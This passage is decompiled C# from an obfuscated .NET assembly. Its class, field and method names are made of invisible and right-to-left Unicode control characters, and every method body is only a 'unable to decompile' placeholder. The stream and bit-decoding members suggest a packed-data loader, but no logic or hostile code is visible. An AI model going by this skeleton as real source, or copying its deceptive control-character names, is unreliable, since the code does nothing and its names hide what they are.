    internal \u003CModule\u003E.\u202E⁯⁯⁭‍⁮‎​⁯‬‌‪⁫‍‬‬‌‭‫⁬‍⁮‫‭‫​⁬⁯‫‎‫⁯‍⁫‍‪‪⁮⁯‏‮ \u206D‭‪‏⁮‬⁭⁬​‎⁭⁭‌‪⁫‪⁭‍‏⁭‬‮‍‭‪‌‏⁯​‫‍‍‎⁫‎⁪⁫‬‫⁭‮;
    internal uint \u206E‪⁫‫​‍⁭‫‏⁫⁯⁬‭‎⁯‎‭⁮‫‎⁫⁫⁬⁮⁯‫‎⁫‫‌​⁭⁬‏‭‮⁮⁮⁪‎‮;

    internal \u206F‫‮‫‌‮⁭⁯‭‎⁬‫‍⁭‮‪⁭‫‎‎⁬‌⁯‭‫⁬‬‌‭⁫‭⁬⁬‏‭‭⁮‍​‭‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200E​‮‍‍⁪‪‎⁪‌‌‌⁪‫‮‮⁭‌‏‮‏​‭⁮‍⁪​‍⁪‫‫‬‏‍⁪‭‏⁮‬‬‮([In] uint obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u202C⁮‏‪‬‎⁯⁯‪⁭⁯​​⁭‮⁮⁭‎‬⁪‎​‎⁬⁬‌‌‌⁪⁮⁯⁪⁯⁯‬‍‏‏‫‪‮([In] int obj0, [In] int obj1)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200E‭⁫‌⁪‍‎⁭‫‏⁮‏⁮‫⁯‫‪⁬‏‍‏‬⁭⁭⁪‏​‪‎‮​‬⁮‮‭⁬⁭‏‍⁪‮([In] int obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200B‬‬⁬⁯​⁮⁬​⁫‎​⁬‪‍‎⁬⁯‪⁯‮‫​‌‭‌‍‮‍‬‎⁬‌⁮⁭⁮‮‬‮‍‮([In] Stream obj0, [In] Stream obj1)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200B‭‪⁫‮‍‏‮⁬‪‍⁪‪‬‫⁯⁯⁫⁫⁬⁫‎‍‍‪‎⁯‮⁮‏‮‏‫‪‌⁫‫⁫‎‏‮(
      [In] Stream obj0,
      [In] Stream obj1,
      [In] long obj2,
      [In] long obj3)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u202D‎‬⁪‬‎‏‎‌‫⁮⁪‏​⁬‭‮‮⁭‪⁭‬⁫‎⁬‬⁫⁬⁯⁫‫⁬‏‬‌⁬​⁮‬‏‮([In] byte[] obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal static uint \u206B⁯⁮‎‮‍‏​⁪⁮⁭‌⁭‫‏‏‏‭‬⁮‏‬​⁫⁮‍‫⁬‪⁮‍‍⁬⁮​‮‎‮​⁯‮([In] uint obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal class \u206E‫‭‫⁪‪​‏⁬‎⁮⁭⁫‮⁭⁬⁬⁬⁯⁮‏‭⁯‫⁫⁫⁭‪⁬⁭‏⁭‬‭‍⁪‫‮‏‎‮
    {
      internal readonly \u003CModule\u003E.\u202E⁯⁯⁭‍⁮‎​⁯‬‌‪⁫‍‬‬‌‭‫⁬‍⁮‫‭‫​⁬⁯‫‎‫⁯‍⁫‍‪‪⁮⁯‏‮[] \u206B⁯​⁯⁫⁯‫‪⁪⁪⁭⁮‬⁭‮‍​‍⁫⁭‬⁪‬‪‬⁭‫⁬‪⁫‭⁮⁪‮‌‭‬‬⁫⁫‮;
      internal readonly \u003CModule\u003E.\u202E⁯⁯⁭‍⁮‎​⁯‬‌‪⁫‍‬‬‌‭‫⁬‍⁮‫‭‫​⁬⁯‫‎‫⁯‍⁫‍‪‪⁮⁯‏‮[] \u202D⁪‏⁯‭‏⁫⁬⁯‪⁪‮‍‍‬‌​⁯⁯⁯‍⁯⁫⁯‏‏‌‌‮‮‍⁯‍⁯‭‌⁯⁭⁭⁬‮;
      internal \u003CModule\u003E.\u202C‭‍‎‪⁭‪‮‬‎‬‭‫‪‫‍‎‫⁫⁯‫‬‬⁪⁭‬⁭⁪‬‫‌⁬⁬⁫⁭⁫‬⁯⁯⁬‮ \u200B‍‮‫⁪⁬⁮⁭‏⁯‭‭⁮‏⁭⁬⁯‭⁭‎⁫⁪‫‫‌‭‭‌‪⁬​‍‏‬‫⁪⁫‌⁫‮‮;
      internal \u003CModule\u003E.\u202C‭‍‎‪⁭‪‮‬‎‬‭‫‪‫‍‎‫⁫⁯‫‬‬⁪⁭‬⁭⁪‬‫‌⁬⁬⁫⁭⁫‬⁯⁯⁬‮ \u206B‪‮⁯⁮‪‫‏‭⁯‮⁮‎‪⁫‬‭⁬‮​⁯​⁮‫⁫‍‪⁪‎‏‭‬‏⁭⁭‌⁮‮‎‌‮;
      internal \u003CModule\u003E.\u202E⁯⁯⁭‍⁮‎​⁯‬‌‪⁫‍‬‬‌‭‫⁬‍⁮‫‭‫​⁬⁯‫‎‫⁯‍⁫‍‪‪⁮⁯‏‮ \u202A​‪‎⁮⁬⁮⁬‏⁯‌‍⁯⁯‪‏‏‮‌‬⁯‬‫‏‭‪‌‎‬‮‍⁯‏‏⁭⁬⁭⁬‏‍‮;
      internal uint \u206D‮‪⁫⁭‬‌‫‍‫⁪⁮⁭‫‏‭‮⁭⁮‎⁮‍‮⁪⁭⁬‬⁭‮‎⁬⁫‫‎⁮‬‏​⁯⁪‮;

      internal void \u200B‪⁮⁪‌‮⁯‭‫⁯‍‪⁫‮‌‌‭‎⁯⁮⁯⁬‮‬⁫‎‪⁮‭⁭⁪‭‭‏‍⁪⁮⁭‪‮‮([In] uint obj0)
      {
        // ISSUE: unable to decompile the method.
      }

      internal void \u206A⁪‎‎⁮⁯‏⁪⁪⁭⁮⁯⁯⁪‬‮⁬‭​⁪‍‎⁫‮‎⁪⁫‏⁯‪⁭⁮⁯⁫‏‍‍‫‏⁭‮()
      {
        // ISSUE: unable to decompile the method.
      }

      internal uint \u206C⁬‪⁭‬⁪⁫⁫⁪⁯‎‏‏‫‌⁭‌‮⁯‌‍‭‏⁮⁪⁪⁬⁫⁬⁪​‏‎‎‬⁯‎⁯⁭⁭‮(
        [In] \u003CModule\u003E.\u200E⁯⁯‪⁯⁯⁫​⁬‬‌​‭‍‬‎‎‪⁮‬⁬⁭⁫⁭‫‍‮⁮⁫⁬⁬⁭‎‭‌‬‬‭‬⁪‮ obj0,
        [In] uint obj1)
      {
        // ISSUE: unable to decompile the method.
      }

      internal \u206E‫‭‫⁪‪​‏⁬‎⁮⁭⁫‮⁭⁬⁬⁬⁯⁮‏‭⁯‫⁫⁫⁭‪⁬⁭‏⁭‬‭‍⁪‫‮‏‎‮()
      {
        // ISSUE: unable to decompile the method.
      }
    }

    internal class \u206E⁬‫‪​‎⁬‎‫⁬‍‎⁯‫‎‎⁯​‮‍‏⁭‪‮‪‪‫‭‫‌⁮‭‫‪⁭​⁯‪‫‌‮
    {
      internal \u003CModule\u003E.\u206F‫‮‫‌‮⁭⁯‭‎⁬‫‍⁭‮‪⁭‫‎‎⁬‌⁯‭‫⁬‬‌‭⁫‭⁬⁬‏‭‭⁮‍​‭‮.\u206E⁬‫‪​‎⁬‎‫⁬‍‎⁯‫‎‎⁯​‮‍‏⁭‪‮‪‪‫‭‫‌⁮‭‫‪⁭​⁯‪‫‌‮.\u202A‌⁯⁪‮⁫‪​⁪‌⁮‏‬‬‮‫⁯⁫⁭‏‭‭⁪⁪‏⁯​​​⁬⁮‌‌‮‎‏‮‬⁪⁫‮[] \u200E⁮⁬⁯‬‏‏‌‬‏⁬‎‎⁮‫⁫‌‫⁭⁯‌‮‍⁭​‎⁪‪‌‪‮⁪⁮‍‪⁭⁭⁯‪‪‮;
      internal int \u202A⁯‬‎‮⁭‎‬⁮‪⁮‍‪‌‌⁬‪‏⁬⁯‌‍​⁪‭​⁮⁭‍⁯‪‫‬‏‪‭‪‎‬‫‮;
      internal int \u206C‏‮⁬‮​‬⁮‮‮​‍‍⁫‮⁭​⁭⁪‏‪‎‫‎⁪‫⁬‬‭⁭⁪⁮‪⁮‌‭⁭⁮‫‮;
      internal uint \u202E⁯‮‌⁮⁪⁪‪⁫⁪‭‫⁯‬‮‍‬‬‏‍‎⁪‪⁮⁯‌‬⁫‌⁮‌‍⁭⁯⁬‮‪⁫‪⁯‮;

      internal void \u206A⁮‍⁫⁪‌‎‮‪⁮⁮⁯‎‪‪⁯⁯‮‭‫‬‏‭‎⁪⁫‫‬‎‌​⁫‮‪‪⁬‎⁫‏‎‮([In] int obj0, [In] int obj1)
      {
        // ISSUE: unable to decompile the method.
      }

      internal void \u200B​​⁯⁫‎⁭⁭‌⁭⁬‫⁮​‫‍‮‮​‬‌⁯⁪‎‏‫​‌⁪‮⁫‪‎‍‭​⁯‮⁭‮‮()
      {
        // ISSUE: unable to decompile the method.
      }

      internal uint \u206D‬⁪⁬‪‍⁬⁭⁪⁬⁬‮‌‏‮⁬‌‎⁯⁪⁮⁭‭​⁯⁬⁭‌⁯‎⁯‏‫⁮⁫⁯‪‌‫⁮‮([In] uint obj0, [In] byte obj1)
      {
        // ISSUE: unable to decompile the method.
      }

      internal byte \u202C⁫‪‬⁭‍‌⁬⁭‍‏⁭‏​​‪⁪‍⁮⁭⁬⁪‭⁯⁪⁭⁮‫⁮‎‏‫⁮‬⁬‮⁪⁫‬‪‮(
        [In] \u003CModule\u003E.\u200E⁯⁯‪⁯⁯⁫​⁬‬‌​‭‍‬‎‎‪⁮‬⁬⁭⁫⁭‫‍‮⁮⁫⁬⁬⁭‎‭‌‬‬‭‬⁪‮ obj0,
        [In] uint obj1,
        [In] byte obj2)
      {
        // ISSUE: unable to decompile the method.
      }

      internal byte \u202E‍‭‍‭‏‍​‭⁯⁬‮⁫‬‫⁭⁫⁭‫⁫⁮⁪​⁯‬‏⁮⁪​‏​⁪​⁭⁬⁭⁬‭⁫‏‮(
        [In] \u003CModule\u003E.\u200E⁯⁯‪⁯⁯⁫​⁬‬‌​‭‍‬‎‎‪⁮‬⁬⁭⁫⁭‫‍‮⁮⁫⁬⁬⁭‎‭‌‬‬‭‬⁪‮ obj0,
        [In] uint obj1,
        [In] byte obj2,
        [In] byte obj3)
      {
        // ISSUE: unable to decompile the method.
      }

      internal \u206E⁬‫‪​‎⁬‎‫⁬‍‎⁯‫‎‎⁯​‮‍‏⁭‪‮‪‪‫‭‫‌⁮‭‫‪⁭​⁯‪‫‌‮()
      {
        // ISSUE: unable to decompile the method.
      }

      internal struct \u202A‌⁯⁪‮⁫‪​⁪‌⁮‏‬‬‮‫⁯⁫⁭‏‭‭⁪⁪‏⁯​​​⁬⁮‌‌‮‎‏‮‬⁪⁫‮
      {
        internal \u003CModule\u003E.\u202C‭‍‎‪⁭‪‮‬‎‬‭‫‪‫‍‎‫⁫⁯‫‬‬⁪⁭‬⁭⁪‬‫‌⁬⁬⁫⁭⁫‬⁯⁯⁬‮[] \u206D‍‫‏‬‬⁭​⁬⁫⁬⁮‬‏⁮‬‮‫⁭⁫⁫‪‎⁪⁯‮⁭⁮⁮‫‌‏⁯‪‏‏‮‌‪⁮‮;

        internal void \u202D⁮⁪‬⁯‍‏⁯⁭‌⁭‮⁫⁮​‏‌⁬⁪⁬⁮‏‍‪⁭‫‮‬‫⁮⁬⁯‬​​‬⁪‍‬‭‮()
        {
          // ISSUE: unable to decompile the method.
        }

        internal void \u202E⁬‫‏⁫‬‌‬⁬⁬⁯⁯⁪⁬‬​‍⁭‪‌‍⁭⁪⁬⁪​‪⁮‌⁬‬‌​‎‏‏‮⁪‎‏‮()
        {
          // ISSUE: unable to decompile the method.
        }

        internal byte \u202D‎⁪​‭‬‮‌⁮‭‍‫⁪‪⁯⁬‎⁫‍‏⁮‏⁬‎⁪⁬‌‫‎‎‍​‬‫‮⁯‪‎⁫‍‮(
          [In] \u003CModule\u003E.\u200E⁯⁯‪⁯⁯⁫​⁬‬‌​‭‍‬‎‎‪⁮‬⁬⁭⁫⁭‫‍‮⁮⁫⁬⁬⁭‎‭‌‬‬‭‬⁪‮ obj0)
        {
          // ISSUE: unable to decompile the method.
        }

        internal byte \u206E‏‍‌⁮⁯‌⁬⁯⁫⁯‏‌‮‍⁪⁯⁬⁯⁮‌⁯‬‌⁯⁭‭⁭⁭‪‎⁮‎‮⁭‮‪⁯​⁮‮(
          [In] \u003CModule\u003E.\u200E⁯⁯‪⁯⁯⁫​⁬‬‌​‭‍‬‎‎‪⁮‬⁬⁭⁫⁭‫‍‮⁮⁫⁬⁬⁭‎‭‌‬‬‭‬⁪‮ obj0,
          [In] byte obj1)
        {
          // ISSUE: unable to decompile the method.
        }
      }
    }
  }

  internal class \u200C‬⁯‪‍‌⁪​⁫⁫‮‍‭⁪⁪‍⁮‪⁫⁪‍⁬⁪⁬‎‏‪‪‫‍‍⁮⁯‍‍⁭⁫‎‎‭‮
  {
    internal byte[] \u206E‏⁭‍⁭⁭‭⁯⁮⁪​⁯‌⁮‍‬⁯⁯‏‌‭‍⁮⁮‭⁮⁯⁮⁬⁫‬⁯⁭‍‪⁪​⁮‍⁮‮;
    internal uint \u202E⁭⁮⁫⁬‭⁯‮⁪‪‎⁮‎‍⁪‫⁭‪​‎‬‮⁯‮⁬⁭⁫‬⁪​‍‮‏⁬​⁮‬‭⁭‬‮;
    internal Stream \u202B⁯​‭‮⁭⁭‎‍⁮‏‍‫‭⁪​⁪​‍‫⁯‌‎‏⁬‭‍⁮‏⁪‭‌⁪‫‌⁮⁯⁬⁪⁬‮;
    internal uint \u206A‬‎⁮‌‏⁭‪‎‮‮‪⁬⁮‮⁮‎​‏⁯⁭⁪⁭‪⁫‍‭⁫‭⁪⁭‫‫‏⁮⁯‮⁮‬‏‮;
    internal uint \u202E⁭⁪⁯⁭⁮⁮‏⁯‏‮‌⁪⁬‮⁮‏‎‬‎⁭‫​⁫⁮‌⁪⁭‫⁬‭‪‎‎‫‏‌⁯⁯‪‮;

    internal void \u200E⁫⁮‭⁪​‪⁭‪‎‬‮⁯‌‭⁯‌​⁯⁯‭‮⁬‭‮⁬‬⁫⁫⁬⁪‏‏⁬‎‮⁮⁮‫⁫‮([In] uint obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200D‍⁫‮‭⁬⁪‎‮⁬​‭‮⁯⁫‏‍‌‎‮‌​⁮‮‬⁭‍‌‏‌‍⁯​‍‪‮⁫⁭‪‏‮([In] Stream obj0, [In] bool obj1)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u206D⁯‮⁮‏‌‬‎‬⁪‬⁮⁯⁫⁭⁭‍‎‪‎‭‬‌⁪‍⁮⁫‪⁬‌‬⁭‪‭⁬‮‬‬⁪‮‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u202C‎‫⁪⁯‍‏‎⁫⁮⁫⁬⁮‏‏⁯⁬⁫‌⁬⁬⁯⁪‬‍‎⁪‌‌‏‎‪‏‪⁮⁫‍⁭​⁫‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u202B⁭‌‌⁬⁬‏‪​‬⁫‎⁭⁭‏⁫‭‏‪‌‪‫‌‪‏​‌​⁪⁮⁬‍‌‎‮‍⁯‍‭⁭‮([In] uint obj0, [In] uint obj1)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u202B​‭⁭‏‎​‪‬⁫⁬‌⁫‎‌⁭‎‎‌‭‌⁭‭⁮⁬‪⁮⁭‫‪‫‍‏​‮‫‬⁬⁬‪‮([In] byte obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal byte \u200B⁬⁪⁮⁪⁫‎‭⁭‍‏‍‮‍⁬⁬⁪​⁬‏‪‏‭‎⁫‍⁫‫⁯‮‌⁭⁮‎‍‏‪‍⁪‏‮([In] uint obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal \u200C‬⁯‪‍‌⁪​⁫⁫‮‍‭⁪⁪‍⁮‪⁫⁪‍⁬⁪⁬‎‏‪‪‫‍‍⁮⁯‍‍⁭⁫‎‎‭‮()
    {
      // ISSUE: unable to decompile the method.
    }
  }

  internal struct \u200D⁭‏‮⁯⁫‏‪‌⁯⁫⁯⁪⁭⁪‮‍​‫⁬‌​​‭⁮‪‭‍⁮‌​‫‍⁫⁯‏⁯⁮‏‎‮
  {
    internal uint \u200C‌‬‎‌‌‬‌‫⁬​⁭⁯‫‏‬‫‍‮‭‬‭⁫​‍‌⁮‌‌‪​‮⁮‫‬‌​⁮‮⁫‮;

    internal void \u202A⁯⁬⁭⁬‍⁯‏⁫‎‫⁫​⁫‫‌‮⁬‎‮‎‌‫⁬‎‬⁫​​‍⁫⁮‪‭‎⁬‪​‪‏‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200D⁮‪⁪⁪‎‪⁬⁪⁭‏⁬⁬‭‍‫⁪‮‬‪⁬‪‮‍⁮⁯‫⁪⁬‎‭⁬‍⁮‬⁯‫‮‭⁪‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u206F‬⁫⁪‬⁭‏⁭⁯‏‪⁬‏‪‎⁬‎⁭‭‮⁪‬‫⁯⁪​‎⁮⁭⁯‫⁫‍‫‭⁮⁬‌‎‍‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u200B‬⁪‎‌⁪‪‪⁭‎‏⁫‏‬‎⁪‬‫‫⁫⁫⁬‍‭‫‪‪‎⁭‏‫‍⁪‎‎‭‏‮​‏‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u206F​⁭⁭​​‫‌‎⁯​​‮‪‎‏‬‏⁫‫‎‭‏‭‬‎⁮​‫‌⁯‍‍⁭⁮⁮⁪‬‌‮‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal bool \u202A‏‮‫‮⁯‬‎⁪‌‪‮​⁫⁯⁭‫‬⁯⁭‫⁯⁯⁯​⁮⁮‏‬‫⁫⁪‎‌⁮‏‌⁯‍‎‮()
    {
      // ISSUE: unable to decompile the method.
    }
  }

  [StructLayout(LayoutKind.Explicit, Size = 384)]
  internal struct \u200D⁫‪⁪‭​⁯⁬‮‏​‌‬⁮⁬‭‬⁬‮​‫‬⁫‌‬⁭⁪⁬⁯‫⁪‍‎⁭‪‏‪‌‍‮‮
  {
  }

  [StructLayout(LayoutKind.Explicit, Size = 6336, Pack = 1)]
  internal struct \u200C‭‫⁮⁪‪⁮⁪​⁮‫⁭‍⁪‌‪‍‫‍‏⁮‎‏⁪⁮​‬⁯⁮‫‭⁯⁪‍‪⁪‌‫⁯⁯‮
  {
  }
}
